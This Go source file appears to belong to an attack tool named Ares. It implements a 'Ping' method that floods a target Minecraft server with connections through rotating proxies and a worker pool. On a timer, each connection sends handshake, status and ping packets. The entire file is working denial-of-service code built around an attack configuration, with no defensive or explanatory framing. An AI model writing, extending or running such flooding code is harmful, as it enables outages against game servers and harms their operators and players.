package methods

import (
	"Ares/core"
	"Ares/net/minecraft"
	"Ares/net/minecraft/packet"
	"Ares/utils/mcutils"
	"fmt"
	"log"
	"net"
	"strconv"
	"time"

	"github.com/panjf2000/ants/v2"
)

type Ping struct {
	Config          *core.AttackConfig
	isRunning       bool
	handshakePacket packet.Packet
	pool            *ants.Pool
}

func (p *Ping) Start() {
	var err error
	p.pool, err = ants.NewPool(p.Config.PerDelay, ants.WithPreAlloc(true))
	if err != nil {
		log.Fatal(err)
	}
	ip, port, err := net.SplitHostPort(p.Config.Host)
	if err != nil {
		fmt.Println(err)
	}
	iport, _ := strconv.Atoi(port)
	if err != nil {
		fmt.Println(err)
	}

	p.handshakePacket = mcutils.GetHandshakePacket(ip, iport, p.Config.Version, mcutils.Status)

	p.isRunning = true

	done := make(chan struct{})

	for i := 0; i < p.Config.Loops; i++ {
		p.loop(done)
	}
}

func (p *Ping) loop(done chan struct{}) {
	ticker := time.NewTicker(p.Config.Delay)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			for i := 0; i < p.Config.PerDelay; i++ {
				p.pool.Submit(p.connect)
			}
		case <-done:
			return
		}
	}
}

func (p *Ping) connect() {
	conn, err := minecraft.DialMc(p.Config.Host, p.Config.ProxyManager.GetNext())
	if err != nil {
		return
	}

	conn.WritePacket(p.handshakePacket)
	conn.WritePacket(packet.Marshal(
		0x00,
	))
	conn.WritePacket(packet.Marshal(
		0x01,
		packet.Long(time.Now().Unix()),
	))

	defer conn.Close()
}

func (p *Ping) Stop() {

}
